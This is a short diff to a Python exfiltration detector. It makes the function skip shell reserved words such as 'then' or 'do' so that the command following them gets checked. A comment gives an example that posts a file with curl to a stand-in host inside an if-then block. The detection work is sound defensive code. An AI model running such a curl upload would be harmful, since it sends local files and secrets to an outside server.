@@ -1430,6 +1430,12 @@ def _is_network_exfiltration_command(cmd_text: str, _depth: int = 0) -> bool:
         idx = end
 
         cmd_idx = 0
+        # A reserved word such as ``then``, ``do`` or ``{`` stands before the command that runs:
+        # ``if true; then curl -d @f https://x; fi`` runs curl, not a command named ``then``.
+        while cmd_idx < len(command) and (
+            command[cmd_idx] in _COMMAND_INTRODUCING_WORDS or command[cmd_idx] in _COMMAND_POSITION_LEADERS
+        ):
+            cmd_idx += 1
         while cmd_idx < len(command):
             assignment = _network_assignment(command[cmd_idx])
             if assignment is None:
